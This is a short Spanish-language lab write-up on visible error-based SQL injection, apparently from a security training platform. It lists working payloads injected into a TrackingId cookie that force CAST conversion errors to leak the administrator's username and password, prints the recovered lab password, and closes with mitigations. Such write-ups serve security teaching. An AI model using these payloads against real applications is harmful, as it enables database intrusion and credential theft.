Lab 13

Visible Error-based SQL Injection

Información del laboratorio

Nivel: Practitioner

Tipo de SQLi: Visible Error-based / In-band SQL Injection

Objetivo

Comprometer la cuenta del usuario administrator forzando al motor de base de datos a revelar información sensible mediante mensajes de error visibles.

Vulnerabilidad

La aplicación no maneja correctamente las excepciones del motor SQL y muestra errores completos en el frontend.

Esto permite provocar errores de conversión de tipo para que el valor evaluado aparezca dentro del mensaje de error.

Procedimiento

Paso 1 — Confirmar SQL Injection

TrackingId='

El servidor devuelve un error SQL, confirmando que la inyección es posible.

Paso 2 — Controlar la consulta

TrackingId='--

La página carga correctamente, confirmando que podemos comentar la consulta.

Paso 3 — Probar conversión de tipos

TrackingId=' AND 1=CAST((SELECT 1) AS int)--

La consulta se ejecuta sin errores.

Paso 4 — Extraer el username

TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

El servidor intenta convertir el texto en número y muestra el valor en el error.

Paso 5 — Extraer la contraseña

TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

El error revela la contraseña: 

i3rpmtbwp1xi74smj59z

Mitigación recomendada

  • Uso de consultas parametrizadas.
  • Manejo seguro de excepciones.
  • No mostrar errores SQL al usuario.
  • Principio de mínimo privilegio.
